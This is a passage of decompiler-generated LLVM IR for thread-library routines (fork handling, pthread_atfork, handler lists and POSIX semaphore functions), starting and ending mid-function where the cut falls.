  %v0_8057ad4 = load i32, i32* bitcast (i32** @global_var_807513c.593 to i32*), align 4
  %v1_8057ada = inttoptr i32 %v0_8057ad4 to i32*
  %v2_8057ada = call i32 @__pthread_unlock(i32* %v1_8057ada)
  %v1_8057ae4 = call i32 @__pthread_manager(i32 %arg1)
  ret i32 %v1_8057ae4
}

define i32 @pthread_insert_list(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057aec = load i32, i32* @edx, align 4
  %v1_8057aec = icmp eq i32 %v0_8057aec, 0
  %v0_8057aee = load i32, i32* @ebx, align 4
  store i32 %v0_8057aee, i32* %stack_var_-4, align 4
  %v0_8057aef = load i32, i32* @eax, align 4
  store i32 %v0_8057aef, i32* %ebx.global-to-local, align 4
  br i1 %v1_8057aec, label %dec_label_pc_8057b0e, label %dec_label_pc_8057af3

dec_label_pc_8057af3:                             ; preds = %entry
  %v4_8057af3 = icmp eq i32 %arg1, 0
  %v1_8057af8 = icmp eq i1 %v4_8057af3, false
  br i1 %v1_8057af8, label %dec_label_pc_8057aff.preheader, label %dec_label_pc_8057b05

dec_label_pc_8057aff.preheader:                   ; preds = %dec_label_pc_8057af3
  %v1_8057aff2 = inttoptr i32 %v0_8057aef to i32*
  %v2_8057aff3 = load i32, i32* %v1_8057aff2, align 4
  %v1_8057b014 = icmp eq i32 %v2_8057aff3, 0
  %v1_8057b0311 = icmp eq i1 %v1_8057b014, false
  br i1 %v1_8057b0311, label %dec_label_pc_8057afc, label %dec_label_pc_8057b05

dec_label_pc_8057afc:                             ; preds = %dec_label_pc_8057aff.preheader, %dec_label_pc_8057afc
  %v2_8057aff12 = phi i32 [ %v2_8057aff, %dec_label_pc_8057afc ], [ %v2_8057aff3, %dec_label_pc_8057aff.preheader ]
  %v1_8057afc = add i32 %v2_8057aff12, 4
  store i32 %v1_8057afc, i32* %ebx.global-to-local, align 4
  %v1_8057aff = inttoptr i32 %v1_8057afc to i32*
  %v2_8057aff = load i32, i32* %v1_8057aff, align 4
  %v1_8057b01 = icmp eq i32 %v2_8057aff, 0
  %v1_8057b03 = icmp eq i1 %v1_8057b01, false
  br i1 %v1_8057b03, label %dec_label_pc_8057afc, label %dec_label_pc_8057aff.dec_label_pc_8057b05.loopexit_crit_edge

dec_label_pc_8057aff.dec_label_pc_8057b05.loopexit_crit_edge: ; preds = %dec_label_pc_8057afc
  br label %dec_label_pc_8057b05

dec_label_pc_8057b05:                             ; preds = %dec_label_pc_8057aff.preheader, %dec_label_pc_8057aff.dec_label_pc_8057b05.loopexit_crit_edge, %dec_label_pc_8057af3
  %v1_8057b05 = load i32, i32* @ecx, align 4
  %v2_8057b05 = inttoptr i32 %v1_8057b05 to i32*
  store i32 %v0_8057aec, i32* %v2_8057b05, align 4
  %v0_8057b07 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057b07 = inttoptr i32 %v0_8057b07 to i32*
  %v2_8057b07 = load i32, i32* %v1_8057b07, align 4
  %v1_8057b09 = load i32, i32* @ecx, align 4
  %v2_8057b09 = add i32 %v1_8057b09, 4
  %v3_8057b09 = inttoptr i32 %v2_8057b09 to i32*
  store i32 %v2_8057b07, i32* %v3_8057b09, align 4
  %v0_8057b0c = load i32, i32* @ecx, align 4
  %v1_8057b0c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057b0c = inttoptr i32 %v1_8057b0c to i32*
  store i32 %v0_8057b0c, i32* %v2_8057b0c, align 4
  %v2_8057b0e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8057b0e

dec_label_pc_8057b0e:                             ; preds = %entry, %dec_label_pc_8057b05
  %v2_8057b0e = phi i32 [ %v0_8057aee, %entry ], [ %v2_8057b0e.pre, %dec_label_pc_8057b05 ]
  %.0 = phi i32 [ undef, %entry ], [ %v2_8057b07, %dec_label_pc_8057b05 ]
  store i32 %v2_8057b0e, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_8057aff, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8057b0e, { 1, 0 }
  uselistorder label %dec_label_pc_8057b05, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057afc, { 1, 0 }
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp16, i32* %stack_var_-12, align 4
  %v0_8057b11 = load i32, i32* @eax, align 4
  store i32 %v0_8057b11, i32* %ebx.global-to-local, align 4
  %v1_8057b1d2 = icmp eq i32 %v0_8057b11, 0
  %v1_8057b1f9 = icmp eq i1 %v1_8057b1d2, false
  br i1 %v1_8057b1f9, label %dec_label_pc_8057b18.lr.ph, label %dec_label_pc_8057b21

dec_label_pc_8057b18.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057b18

dec_label_pc_8057b18:                             ; preds = %dec_label_pc_8057b18.lr.ph, %dec_label_pc_8057b18
  %v4_8057b18 = phi i32 [ %v0_8057b11, %dec_label_pc_8057b18.lr.ph ], [ %v3_8057b1a, %dec_label_pc_8057b18 ]
  %v5_8057b18 = inttoptr i32 %v4_8057b18 to i32*
  %v6_8057b18 = load i32, i32* %v5_8057b18, align 4
  call void @__pseudo_call(i32 %v6_8057b18)
  %v0_8057b1a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057b1a = add i32 %v0_8057b1a, 4
  %v2_8057b1a = inttoptr i32 %v1_8057b1a to i32*
  %v3_8057b1a = load i32, i32* %v2_8057b1a, align 4
  store i32 %v3_8057b1a, i32* %ebx.global-to-local, align 4
  %v1_8057b1d = icmp eq i32 %v3_8057b1a, 0
  %v1_8057b1f = icmp eq i1 %v1_8057b1d, false
  br i1 %v1_8057b1f, label %dec_label_pc_8057b18, label %dec_label_pc_8057b1d.dec_label_pc_8057b21_crit_edge

dec_label_pc_8057b1d.dec_label_pc_8057b21_crit_edge: ; preds = %dec_label_pc_8057b18
  %v2_8057b21.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8057b21

dec_label_pc_8057b21:                             ; preds = %dec_label_pc_8057b1d.dec_label_pc_8057b21_crit_edge, %entry
  %v2_8057b21 = phi i32 [ %v2_8057b21.pre, %dec_label_pc_8057b1d.dec_label_pc_8057b21_crit_edge ], [ %tmp16, %entry ]
  ret i32 %v2_8057b21

; uselistorder directives
  uselistorder i32 %v3_8057b1a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057b18, { 1, 0 }
}

define i32 @fork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057b25 = load i32, i32* @ebp, align 4
  %v0_8057b26 = load i32, i32* @edi, align 4
  %v0_8057b27 = load i32, i32* @esi, align 4
  %v0_8057b28 = load i32, i32* @ebx, align 4
  store i32 %v0_8057b28, i32* %stack_var_-16, align 4
  %v1_8057b31 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8079b0c.594 to i32))
  %v0_8057b36 = load i32, i32* @global_var_8079b24.595, align 4
  store i32 %v0_8057b36, i32* @eax, align 4
  %v0_8057b3b = load i32, i32* @global_var_8079b28.596, align 8
  store i32 %v0_8057b3b, i32* @ebp, align 4
  %v0_8057b41 = load i32, i32* @global_var_8079b2c.597, align 4
  store i32 %v0_8057b41, i32* @ebx, align 4
  %v0_8057b47 = call i32 @pthread_call_handlers()
  %v0_8057b4c = call i32 @__pthread_once_fork_prepare()
  %v1_8057b58 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  %v0_8057b5d = call i32 @__libc_fork()
  %v1_8057b65 = icmp eq i32 %v0_8057b5d, 0
  store i32 %v0_8057b5d, i32* @edi, align 4
  %v1_8057b69 = icmp eq i1 %v1_8057b65, false
  br i1 %v1_8057b69, label %dec_label_pc_8057bea, label %dec_label_pc_8057b6b

dec_label_pc_8057b6b:                             ; preds = %entry
  %v2_8057b77 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057b77, i32* @ebx, align 4
  %v2_8057b7c = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_8057b86 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 1)
  %v3_8057b93 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8075530.598 to i32), i32* nonnull %stack_var_-20)
  %v1_8057b9b = call i32 @pthread_mutexattr_destroy(i32 %v2_8057b77)
  %v2_8057bab = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-20)
  %v3_8057bb5 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-20, i32 0)
  store i32 0, i32* @esi, align 4
  %v3_8057bc2 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8079b0c.594 to i32), i32* nonnull %stack_var_-20)
  %v1_8057bca = call i32 @pthread_mutexattr_destroy(i32 %v2_8057b77)
  %v0_8057bd2 = call i32 @__pthread_reset_main_thread()
  %v0_8057bd7 = call i32 @__fresetlockfiles()
  %v0_8057bdc = call i32 @__pthread_once_fork_child()
  %v0_8057be1 = load i32, i32* @ebp, align 4
  store i32 %v0_8057be1, i32* @eax, align 4
  %v0_8057be3 = call i32 @pthread_call_handlers()
  br label %dec_label_pc_8057c12

dec_label_pc_8057bea:                             ; preds = %entry
  %v1_8057bf2 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  %v1_8057bfe = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8079b0c.594 to i32))
  %v0_8057c03 = call i32 @__pthread_once_fork_parent()
  %v0_8057c08 = load i32, i32* @ebx, align 4
  store i32 %v0_8057c08, i32* @eax, align 4
  %v0_8057c0a = call i32 @pthread_call_handlers()
  br label %dec_label_pc_8057c12

dec_label_pc_8057c12:                             ; preds = %dec_label_pc_8057b6b, %dec_label_pc_8057bea
  %v0_8057c15 = load i32, i32* @edi, align 4
  %v2_8057c17 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057c17, i32* @ebx, align 4
  store i32 %v0_8057b27, i32* @esi, align 4
  store i32 %v0_8057b26, i32* @edi, align 4
  store i32 %v0_8057b25, i32* @ebp, align 4
  ret i32 %v0_8057c15

; uselistorder directives
  uselistorder i32 ()* @pthread_call_handlers, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057c12, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v1_8057c1c = call i32 @fork(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8057c1c
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8057c27 = call i32 @malloc(i32 24)
  store i32 %v1_8057c27, i32* @ebx, align 4
  %v1_8057c36 = icmp eq i32 %v1_8057c27, 0
  br i1 %v1_8057c36, label %dec_label_pc_8057c8e, label %dec_label_pc_8057c3a

dec_label_pc_8057c3a:                             ; preds = %entry
  %v1_8057c42 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8079b0c.594 to i32))
  store i32 %v1_8057c27, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8079b24.595 to i32), i32* @eax, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8057c54 = call i32 @pthread_insert_list(i32 0)
  %v1_8057c59 = add i32 %v1_8057c27, 8
  store i32 %v1_8057c59, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8079b2c.597 to i32), i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  %v1_8057c67 = call i32 @pthread_insert_list(i32 1)
  %v1_8057c6c = add i32 %v1_8057c27, 16
  store i32 %v1_8057c6c, i32* @ecx, align 4
  store i32 ptrtoint (i32* @global_var_8079b28.596 to i32), i32* @eax, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8057c7a = call i32 @pthread_insert_list(i32 1)
  %v1_8057c84 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8079b0c.594 to i32))
  br label %dec_label_pc_8057c8e

dec_label_pc_8057c8e:                             ; preds = %entry, %dec_label_pc_8057c3a
  %v0_8057c91 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_8057c3a ]
  ret i32 %v0_8057c91

; uselistorder directives
  uselistorder i32 %v1_8057c27, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @pthread_insert_list, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057c8e, { 1, 0 }
}

define i32 @enqueue() local_unnamed_addr {
entry:
  %v0_8057c95 = load i32, i32* @edx, align 4
  %v1_8057c95 = add i32 %v0_8057c95, 24
  %v2_8057c95 = inttoptr i32 %v1_8057c95 to i32*
  %v3_8057c95 = load i32, i32* %v2_8057c95, align 4
  store i32 %v3_8057c95, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057cb1 = load i32, i32* @ebx, align 4
  store i32 %v0_8057cb1, i32* %stack_var_-4, align 4
  %v0_8057cb2 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057cd0

dec_label_pc_8057cb6:                             ; preds = %dec_label_pc_8057cd0
  %v1_8057cb6 = load i32, i32* @edx, align 4
  %v12_8057cb6 = icmp eq i32 %v2_8057cd0, %v1_8057cb6
  %v1_8057cb8 = icmp eq i1 %v12_8057cb6, false
  %v1_8057ccd = add i32 %v2_8057cd0, 8
  br i1 %v1_8057cb8, label %dec_label_pc_8057cd0, label %dec_label_pc_8057cba

dec_label_pc_8057cba:                             ; preds = %dec_label_pc_8057cb6
  %v2_8057cba = inttoptr i32 %v1_8057ccd to i32*
  %v3_8057cba = load i32, i32* %v2_8057cba, align 4
  store i32 %v3_8057cba, i32* %v1_8057cd0, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_8057cba, align 4
  %v2_8057cd8.pre = load i32, i32* %stack_var_-4, align 4
  %v0_8057cd9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057cd8

dec_label_pc_8057cd0:                             ; preds = %dec_label_pc_8057cb6, %entry
  %v1_8057cbd = phi i32 [ %v0_8057cb2, %entry ], [ %v1_8057ccd, %dec_label_pc_8057cb6 ]
  %v1_8057cd0 = inttoptr i32 %v1_8057cbd to i32*
  %v2_8057cd0 = load i32, i32* %v1_8057cd0, align 4
  %v1_8057cd2 = icmp eq i32 %v2_8057cd0, 0
  %v1_8057cd4 = icmp eq i1 %v1_8057cd2, false
  br i1 %v1_8057cd4, label %dec_label_pc_8057cb6, label %dec_label_pc_8057cd6

dec_label_pc_8057cd6:                             ; preds = %dec_label_pc_8057cd0
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057cd8

dec_label_pc_8057cd8:                             ; preds = %dec_label_pc_8057cba, %dec_label_pc_8057cd6
  %v0_8057cd9 = phi i32 [ %v0_8057cd9.pre, %dec_label_pc_8057cba ], [ 0, %dec_label_pc_8057cd6 ]
  %v2_8057cd8 = phi i32 [ %v2_8057cd8.pre, %dec_label_pc_8057cba ], [ %v0_8057cb1, %dec_label_pc_8057cd6 ]
  store i32 %v2_8057cd8, i32* @ebx, align 4
  ret i32 %v0_8057cd9

; uselistorder directives
  uselistorder i32 %v2_8057cd0, { 2, 0, 1 }
  uselistorder i32* %v1_8057cd0, { 1, 0 }
  uselistorder i32 %v1_8057ccd, { 1, 0 }
  uselistorder label %dec_label_pc_8057cd8, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8057cde = add i32 %arg1, 8
  %v2_8057cde = inttoptr i32 %v1_8057cde to i32*
  %v3_8057cde = load i32, i32* %v2_8057cde, align 4
  store i32 %v3_8057cde, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8057cea = load i32, i32* @esi, align 4
  %v0_8057ceb = load i32, i32* @edx, align 4
  store i32 %v0_8057ceb, i32* @esi, align 4
  %v0_8057ced = load i32, i32* @ebx, align 4
  %v0_8057cee = load i32, i32* @eax, align 4
  store i32 %v0_8057cee, i32* @ebx, align 4
  %v1_8057cf3 = icmp eq i32 %v0_8057ceb, 0
  br i1 %v1_8057cf3, label %dec_label_pc_8057cff, label %dec_label_pc_8057cf7

dec_label_pc_8057cf7:                             ; preds = %entry
  %v1_8057cf7 = add i32 %v0_8057cee, 64
  %v2_8057cf7 = inttoptr i32 %v1_8057cf7 to i8*
  %v3_8057cf7 = load i8, i8* %v2_8057cf7, align 1
  %v4_8057cf7 = icmp eq i8 %v3_8057cf7, 0
  %v1_8057cfb = icmp eq i1 %v4_8057cf7, false
  br i1 %v1_8057cfb, label %dec_label_pc_8057d21, label %dec_label_pc_8057d09

dec_label_pc_8057cff:                             ; preds = %entry
  %v1_8057cff = add i32 %v0_8057cee, 28
  %v2_8057cff = inttoptr i32 %v1_8057cff to i32*
  %v3_8057cff = load i32, i32* %v2_8057cff, align 4
  store i32 %v3_8057cff, i32* @eax, align 4
  store i32 %v0_8057cee, i32* @edx, align 4
  %v1_8057d04 = call i32 @__pthread_lock(i32 %v0_8057ced)
  %v1_8057d0b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057d09

dec_label_pc_8057d09:                             ; preds = %dec_label_pc_8057cf7, %dec_label_pc_8057cff
  %v1_8057d0b = phi i32 [ %v0_8057cee, %dec_label_pc_8057cf7 ], [ %v1_8057d0b.pre, %dec_label_pc_8057cff ]
  %v2_8057d0b = add i32 %v1_8057d0b, 444
  %v3_8057d0b = inttoptr i32 %v2_8057d0b to i32*
  store i32 %v0_8057ceb, i32* %v3_8057d0b, align 4
  %v1_8057d11 = icmp eq i1 %v1_8057cf3, false
  br i1 %v1_8057d11, label %dec_label_pc_8057d21, label %dec_label_pc_8057d13

dec_label_pc_8057d13:                             ; preds = %dec_label_pc_8057d09
  %v0_8057d16 = load i32, i32* @ebx, align 4
  %v1_8057d16 = add i32 %v0_8057d16, 28
  %v2_8057d16 = inttoptr i32 %v1_8057d16 to i32*
  %v3_8057d16 = load i32, i32* %v2_8057d16, align 4
  %v1_8057d19 = inttoptr i32 %v3_8057d16 to i32*
  %v2_8057d19 = call i32 @__pthread_unlock(i32* %v1_8057d19)
  br label %dec_label_pc_8057d21

dec_label_pc_8057d21:                             ; preds = %dec_label_pc_8057d09, %dec_label_pc_8057cf7, %dec_label_pc_8057d13
  %v2_8057d21 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8057ced, i32* @ebx, align 4
  store i32 %v0_8057cea, i32* @esi, align 4
  ret i32 %v2_8057d21

; uselistorder directives
  uselistorder i32 %v0_8057ceb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057d21, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057d09, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v1_8057d28 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8057d2d = inttoptr i32 %v1_8057d28 to i32*
  store i32 38, i32* %v1_8057d2d, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v1_8057d3d = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8057d42 = inttoptr i32 %v1_8057d3d to i32*
  store i32 38, i32* %v1_8057d42, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v1_8057d52 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8057d57 = inttoptr i32 %v1_8057d52 to i32*
  store i32 38, i32* %v1_8057d57, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057d6c = add i32 %arg1, 12
  %v2_8057d6c = inttoptr i32 %v1_8057d6c to i32*
  %v3_8057d6c = load i32, i32* %v2_8057d6c, align 4
  %v4_8057d6c = icmp eq i32 %v3_8057d6c, 0
  br i1 %v4_8057d6c, label %dec_label_pc_8057d80, label %dec_label_pc_8057d72

dec_label_pc_8057d72:                             ; preds = %entry
  %v1_8057d72 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8057d7a = inttoptr i32 %v1_8057d72 to i32*
  store i32 16, i32* %v1_8057d7a, align 4
  %v0_8057d80.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057d80

dec_label_pc_8057d80:                             ; preds = %entry, %dec_label_pc_8057d72
  %v0_8057d80 = phi i32 [ 0, %entry ], [ %v0_8057d80.pre, %dec_label_pc_8057d72 ]
  ret i32 %v0_8057d80

; uselistorder directives
  uselistorder label %dec_label_pc_8057d80, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8057d89 = load i32, i32* @ebx, align 4
  store i32 %v0_8057d89, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8057d93 = call i32 @__pthread_lock(i32 %v0_8057d89)
  %v0_8057d98 = load i32, i32* @ebx, align 4
  %v1_8057d98 = add i32 %v0_8057d98, 8
  %v2_8057d98 = inttoptr i32 %v1_8057d98 to i32*
  %v3_8057d98 = load i32, i32* %v2_8057d98, align 4
  %v1_8057d9b = icmp eq i32 %v3_8057d98, 0
  %v1_8057d9d = icmp eq i1 %v1_8057d9b, false
  br i1 %v1_8057d9d, label %dec_label_pc_8057daf, label %dec_label_pc_8057d9f

dec_label_pc_8057d9f:                             ; preds = %entry
  %v0_8057d9f = load i32, i32* %stack_var_-8, align 4
  %v1_8057d9f = call i32 @__errno_location(i32 %v0_8057d9f)
  store i32 -1, i32* @esi, align 4
  %v1_8057da7 = inttoptr i32 %v1_8057d9f to i32*
  store i32 11, i32* %v1_8057da7, align 4
  br label %dec_label_pc_8057db5

dec_label_pc_8057daf:                             ; preds = %entry
  %v1_8057daf = add i32 %v3_8057d98, -1
  store i32 0, i32* @esi, align 4
  store i32 %v1_8057daf, i32* %v2_8057d98, align 4
  br label %dec_label_pc_8057db5

dec_label_pc_8057db5:                             ; preds = %dec_label_pc_8057d9f, %dec_label_pc_8057daf
  %v0_8057db8 = load i32, i32* @ebx, align 4
  %v1_8057db9 = inttoptr i32 %v0_8057db8 to i32*
  %v2_8057db9 = call i32 @__pthread_unlock(i32* %v1_8057db9)
  %v0_8057dc1 = load i32, i32* @esi, align 4
  ret i32 %v0_8057dc1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057db5, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  %v2_8057dd1 = icmp slt i32 %arg3, 0
  %v1_8057dd3 = icmp eq i1 %v2_8057dd1, false
  br i1 %v1_8057dd3, label %dec_label_pc_8057de2, label %dec_label_pc_8057dd5

dec_label_pc_8057dd5:                             ; preds = %entry
  %v1_8057dd5 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8057dd5, i32* %eax.global-to-local, align 4
  %v1_8057dda = inttoptr i32 %v1_8057dd5 to i32*
  store i32 22, i32* %v1_8057dda, align 4
  br label %dec_label_pc_8057e12

dec_label_pc_8057de2:                             ; preds = %entry
  %v4_8057de2 = icmp eq i32 %arg2, 0
  br i1 %v4_8057de2, label %dec_label_pc_8057df9, label %dec_label_pc_8057de9

dec_label_pc_8057de9:                             ; preds = %dec_label_pc_8057de2
  %v1_8057de9 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8057de9, i32* %eax.global-to-local, align 4
  %v1_8057dee = inttoptr i32 %v1_8057de9 to i32*
  store i32 38, i32* %v1_8057dee, align 4
  br label %dec_label_pc_8057e12

dec_label_pc_8057df9:                             ; preds = %dec_label_pc_8057de2
  store i32 0, i32* %arg1, align 4
  %v0_8057dff = load i32, i32* %eax.global-to-local, align 4
  %v1_8057dff = add i32 %v0_8057dff, 4
  %v2_8057dff = inttoptr i32 %v1_8057dff to i32*
  store i32 0, i32* %v2_8057dff, align 4
  %v1_8057e06 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057e06 = add i32 %v1_8057e06, 8
  %v3_8057e06 = inttoptr i32 %v2_8057e06 to i32*
  store i32 %arg3, i32* %v3_8057e06, align 4
  %v0_8057e09 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057e09 = add i32 %v0_8057e09, 12
  %v2_8057e09 = inttoptr i32 %v1_8057e09 to i32*
  store i32 0, i32* %v2_8057e09, align 4
  br label %dec_label_pc_8057e12

dec_label_pc_8057e12:                             ; preds = %dec_label_pc_8057de9, %dec_label_pc_8057dd5, %dec_label_pc_8057df9
  %storemerge = phi i32 [ 0, %dec_label_pc_8057df9 ], [ -1, %dec_label_pc_8057dd5 ], [ -1, %dec_label_pc_8057de9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057e12, { 2, 0, 1 }
}

define i32 @thread_self.1(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8057e16 = load i32, i32* @esp, align 4
  %v1_8057e16 = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_8057e16 = icmp ult i32 %v0_8057e16, %v1_8057e16
  %v1_8057e23 = icmp eq i1 %v7_8057e16, false
  br i1 %v1_8057e23, label %dec_label_pc_8057e54, label %dec_label_pc_8057e25

dec_label_pc_8057e25:                             ; preds = %entry
  %v1_8057e25 = load i32, i32* @global_var_8079c50.566, align 16
  %v7_8057e25 = icmp ult i32 %v0_8057e16, %v1_8057e25
  br i1 %v7_8057e25, label %dec_label_pc_8057e3a, label %dec_label_pc_8057e2d

dec_label_pc_8057e2d:                             ; preds = %dec_label_pc_8057e25
  %v1_8057e2d = load i32, i32* @global_var_8079c54.567, align 4
  %v7_8057e2d = icmp ult i32 %v0_8057e16, %v1_8057e2d
  br i1 %v7_8057e2d, label %dec_label_pc_8057e54, label %dec_label_pc_8057e3a

dec_label_pc_8057e3a:                             ; preds = %dec_label_pc_8057e2d, %dec_label_pc_8057e25
  %v0_8057e3a = load i32, i32* @global_var_807f358.569, align 8
  %v1_8057e3a = icmp eq i32 %v0_8057e3a, 0
  br i1 %v1_8057e3a, label %dec_label_pc_8057e48, label %dec_label_pc_8057e43

dec_label_pc_8057e43:                             ; preds = %dec_label_pc_8057e3a
  %v0_8057e43 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8057e48

dec_label_pc_8057e48:                             ; preds = %dec_label_pc_8057e3a, %dec_label_pc_8057e43
  %v2_8057e4e = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8057e54

dec_label_pc_8057e54:                             ; preds = %dec_label_pc_8057e2d, %entry, %dec_label_pc_8057e48
  %v0_8057e54 = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_8057e2d ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_8057e4e, %dec_label_pc_8057e48 ]
  ret i32 %v0_8057e54

; uselistorder directives
  uselistorder label %dec_label_pc_8057e54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057e48, { 1, 0 }
}

define i32 @new_sem_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8057e55 = load i32, i32* @esi, align 4
  %v0_8057e56 = load i32, i32* @ebx, align 4
  %v2_8057e5a = call i32 @thread_self.1(i32 %v0_8057e56, i32 %v0_8057e55)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_8057e5a, i32* @edx, align 4
  %v1_8057e6d = call i32 @__pthread_lock(i32 %v2_8057e5a)
  store i32 %arg2, i32* @edx, align 4
  %v0_8057e76 = load i32, i32* @ebx, align 4
  %v1_8057e76 = add i32 %v0_8057e76, 12
  store i32 %v1_8057e76, i32* @eax, align 4
  %v0_8057e79 = call i32 @remove_from_queue()
  %v0_8057e81 = load i32, i32* @ebx, align 4
  store i32 %v0_8057e79, i32* @esi, align 4
  %v1_8057e84 = inttoptr i32 %v0_8057e81 to i32*
  %v2_8057e84 = call i32 @__pthread_unlock(i32* %v1_8057e84)
  %v0_8057e8c = load i32, i32* @esi, align 4
  ret i32 %v0_8057e8c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend() local_unnamed_addr {
entry:
  %v0_8057e94 = load i32, i32* @eax, align 4
  %v1_8057e95 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8057e94)
  ret i32 %v1_8057e95
}

define i32 @sem_timedwait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
